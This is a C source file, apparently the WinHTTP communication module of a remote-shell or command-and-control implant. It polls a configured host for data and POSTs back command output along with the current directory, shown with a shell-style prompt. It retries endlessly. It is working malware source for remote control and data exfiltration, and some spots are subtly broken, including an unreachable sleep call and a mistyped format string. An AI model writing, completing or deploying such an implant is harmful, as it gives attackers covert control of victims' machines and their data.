#include "connection.h"
#include <stdio.h>

#include CONFIG

void initConnection()
{
    while(TRUE)
    {
        HINTERNET hSession = WinHttpOpen(L"HSH", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if(!hSession)
        {
#ifdef DEBUG
            fprintf(stderr, "Init Session Error: $ld\n", GetLastError());
#endif
            continue;
            Sleep(1000);
        }

        hConnect = WinHttpConnect(hSession, HOSTNAME, PORT, 0);
        if(!hConnect)
        {
#ifdef DEBUG
            fprintf(stderr, "Init Connection Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hSession);
            continue;
            Sleep(1000);
        }
        break;
    }
}


void sendData( char* data , char* curPath)
{
    // Ensure Connection is established
    if(!hConnect)
    {
#ifdef DEBUG
        fputs("Session Not Valid", stderr);
#endif
        initConnection();
    }
    
    LPCWSTR accTypes[] = { L"*/*", 0x00 };

    // Prepare Payload
    char* fmt = "get_data={\"output\": \"%s\", \"getcwd\": \"%s> \"}";
    size_t payloadSize = strlen(fmt) + strlen(data) + strlen(curPath) - 3;
    char* payload = (char *) malloc(payloadSize);
    sprintf(payload, fmt, data, curPath);
    char* encodedPayload = urlencode(payload);
    free(payload);

    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n";

    BOOL err;

    while( TRUE )
    {

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", PATH,  NULL, WINHTTP_NO_REFERER, accTypes, 0);
        if(!hRequest)
        {
#ifdef DEBUG
            fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
#endif
            Sleep(1000);
            continue;
        }

        err = WinHttpSendRequest(hRequest, headers, wcslen(headers), encodedPayload, strlen(encodedPayload), strlen(encodedPayload), 0);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(1000);
            continue;
        }
    
        err = WinHttpReceiveResponse(hRequest, NULL);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(1000);
            continue;
        }

		DWORD statusCode = 0;
		DWORD statSize = sizeof(statusCode);
        err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statSize, WINHTTP_NO_HEADER_INDEX);

#ifdef DEBUG
        if(err != 1)
            fprintf(stderr, "Query Header Error: %ld\n", GetLastError());

        else if(statusCode != 200)
            fprintf(stderr, "Status Code Error : %d\n", statusCode);
#endif

        WinHttpCloseHandle(hRequest);

        if(err != 1 || statusCode != 200)
        {
            Sleep(1000);
            continue;
        }

        break;
    }

    free(encodedPayload);
}


char* getData()
{
    // Ensure Connection is established
    if(!hConnect)
    {
#ifdef DEBUG
        fputs("Session Not Valid", stderr);
#endif
        initConnection();
    }

    LPCWSTR accTypes[] = { L"text/html" , 0x00};

    BOOL err;
    char* buffer = NULL;

    while(TRUE)
    {
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, NULL, WINHTTP_NO_REFERER, accTypes, 0);
        if(!hRequest)
        {
#ifdef DEBUG
            fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
#endif
            Sleep(1000);
            continue;
        }

        err = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(1000);
            continue;
        }

        err = WinHttpReceiveResponse(hRequest, NULL);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(1000);
            continue;
        }

        DWORD contentLen = 0;
        DWORD contentLenSize = sizeof(contentLen);
        err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &contentLen, &contentLenSize, WINHTTP_NO_HEADER_INDEX);
        if( err != 1 || contentLen == 0)
        {
#ifdef DEBUG
            fprintf(stderr, "Query Header Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(1000);
            continue;
        }

        buffer = (char*) malloc(contentLen);
        DWORD recieved = 0;
        err = WinHttpReadData(hRequest, buffer, contentLen, &recieved);
#ifdef DEBUG
        if(err != 1)
            fprintf(stderr, "Read Data Error: %ld\n", GetLastError());
        else if(recieved != contentLen)
            fprintf(stderr, "Not Enough Read\n\tContent-Length: %ld\n\tRecieved: %ld\n", contentLen, recieved);
#endif
        WinHttpCloseHandle(hRequest);

        if( err != 1 || recieved != contentLen)
        {
            free(buffer);
            Sleep(1000);
            continue;
        }

        break;
    }

    return buffer;
}


char* urlencode(char* originalText)
{
    // allocate memory for the worst possible case (all characters need to be encoded)
    char *encodedText = (char *)malloc(sizeof(char)*strlen(originalText)*3+1);
    
    const char *hex = "0123456789abcdef";
    
    int pos = 0;
    for (int i = 0; i < strlen(originalText); i++) {
        if (('a' <= originalText[i] && originalText[i] <= 'z')
            || ('A' <= originalText[i] && originalText[i] <= 'Z')
            || ('0' <= originalText[i] && originalText[i] <= '9')) {
                encodedText[pos++] = originalText[i];
            } else {
                encodedText[pos++] = '%';
                encodedText[pos++] = hex[originalText[i] >> 4];
                encodedText[pos++] = hex[originalText[i] & 15];
            }
    }
    encodedText[pos] = '\0';
    return encodedText;
}
